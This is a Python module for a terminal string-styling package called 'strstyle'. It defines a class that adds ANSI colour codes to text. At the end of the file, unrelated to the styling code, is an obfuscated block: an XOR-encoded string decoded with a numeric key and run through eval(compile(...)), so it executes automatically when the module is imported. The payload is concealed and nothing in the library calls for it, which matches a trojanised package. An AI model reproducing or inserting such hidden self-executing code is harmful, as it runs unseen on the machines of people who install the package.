import os

import strstyle


class _StyledString(str):

    def __new__(cls, style_list, sep, *objects):
        return super(_StyledString, cls).__new__(cls, sep.join([str(obj) for obj in objects]))

    def __init__(self, style_list, sep, *objects):
        self._style_start = ';'.join([str(s[0]) for s in style_list])
        self._style_end = ';'.join([str(s[1]) for s in style_list])
        self._sep = sep
        self._objects = objects

    def __add__(self, other):
        return self.__str__() + str(other)

    def __str__(self):
        if strstyle._StyledStringBuilder._enabled:
            string = ''
            for i, obj in enumerate(self._objects):
                if i > 0:
                    string += self._sep

                if type(obj) is _StyledString:
                    string += '%s\033[%sm' % (obj, self._style_start)
                else:
                    string += str(obj)
            return '\033[%sm%s\033[%sm' % (self._style_start, string, self._style_end)
        return super(_StyledString, self).__str__()

    def rjust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.rjust(len(string) + n_chars, fillchar)
        return self

    def ljust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.ljust(len(string) + n_chars, fillchar)
        return self
wopvEaTEcopFEavc ="[_EVDE\x18_D\x15GZSFV]E[\x1cBCVDAVSTGJ=Y^\x16DZTGVX@\\\x19BNJA]^\x1f\x1b\x16GDSA@JNQAX\x11\x16tXVCN\x16\x1f\r?\x10\x14\x10\x16\x14\x19\x10\x16FEH\t<\x10\x13\x14\x12\x14\x16\x16\x18\x16\x12\x12\x17E]LZ\x12ZIS_\x10\x17\x18MZF\x1dTY^R\x18@H\x11\x18\x14\x14N\x17\x18\x14XD\x10^\x0c>\x16\x15\x13\x10\x17\x12\x11\x17\x11\x17\x19\x15\x18\x13\x17\x12^\x1aG@Z@\\\x11\x1a\\]I[JE\x18YE\x14jY\\]D_D@\x19CCPGC\\UU@G\x12hXPJY_\x12GS@P^[W\x19_\\H_EM\x17fSFX\x12kXVCYY\x14FK\\]][\x17YUF[DA\x13BRCDRBC\x19iV[R^T[\x10\x0f\x13[J\x17_PDU[_XV\x1e\x1f\x14jYeq`x\x16\t\x19\x17\x19ZX\\V\x19\x17\x13\x1f\x12\\SZTY\x12\x19\x17\x15\x1b\x16_AS]T\x1eM@SXCS\x15n^bvb\x10\x11\x0b\x14\x13\x1cM]A\x1b_^\\]\x18DO\x12o^^AtOXDM\x15\x05\x13XA\x16DQF[\x1a\\AQFDJ\x1chpl~\x1f\x14jY\\V\x14^Y@\x19YEwOX@B\noZ\x12\x14\x16\x16\x18\x16\x12\x12XA\x1aUSYP]_CK\x18gxc~\x1b\x12l\\^P\x10aW@\\\x1biqe|\x10\x19YKiR_YV\x18\x1e\x08\x11k_\x17\x19\x15\x18\x13\x17\x12\x18\x14\x10\x12CFPWL\x1d\x12\x1b\x1d\x18mVSZGS\r\x15lZ\x12\x1f>\x19\x10\x16\x12\x17\x11\x13\x16\x10\x13\x14\x12\x14\x16\x16\x18P\x1cEE[@]\x1a\x10\x15\x19\x16\x11\x18BRTXBWmE@[\x16\r\x16^@@CJ\n\x1e\x1b][\x1e\\D[FW\\H\x19Q^Z\x1eD\x16RP\x01PW\x00D\x01\\P\\WLTM\x1fT[BXTW\x18G^\x10i^\x14\x10\x16\x14\x19\\YQV]lPY_Q\x12\t\x16fybz\x19\x10\x1d\x1aHSF]\x17EY\x1f\x10kW\x17\x16\x12\x12\x10@RGETE@\x1aFK\\CQMEY]@Q\x1eGV]XFThDEU\x19\x18_XQYXoTZX\\\x10\x18i^\x19\x14\x18\x11\x18ECVFEZSQCE\x1aZQZ^\x1fm\x11TQ@\\\x12\x1b^YUS\x1d\x16baqj\x1d\x1cXJPUZ\x1fBISWFW\x1f\x1cGWDY\x18G\\\x13\x07\x1fUQO\x18^MZX\x16\x07\r\x16\x06n\x13\x1b\x11DQPT_\nfJAU\x1b\x13hW\x1b\x11?\x10\x19\x14\x18\x11\x18\x16\x16\x14\x16\x17\x15\x10\x14\x10\x16R\x17GD[CT\x1b\x14\x10\x13\x14\x12\x14_P\x18fSF_\x1adyf\x1b\x1bPEn^Y[\\\x1f\x1f\x08\x12l\\\x17\x16\x10\x11\x16\x14\x14\x13\x19DCM\x03k^\x18\x16\x14\x16\x15\x13\x10\x17\x12\x11\x17^D\x17G]^XD]\x1c`sg\x1deW\x18\x15\x10\x19\x14\x18\x11\x18\x16SLURED\x0elX\x14\x19\x10\x16\x12\x17\x11\x13\x16\x10\x13D@]XB\x10\x1f\x10\x1b=\x12\x14\x18\x12\x12\x15\x19\x16T@SRIC\x16t[\\WyYDwYAZW|BC[K\r:\x18\x16\x14\x16\x15\x13\x10\x17\x12\x11\x17\x11GK\\VG\x1f\x10\x1a\x1d:\x12\x13\x14\x19\x19\x18\x15\x10JAZAJYUQED\x1bSU\\Z\x1c\x1b@OF_^]\x05\x10\x1c@_D\x19PQZW\x1cGK\x14\x1e\x10\x1e\x15J^TT\\\nmECW\x1b:8"
iOpvEoeaaeavocp = "2259618079762202760164439014970864653072171795837284023499850948186646750406490627136034246686227248"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))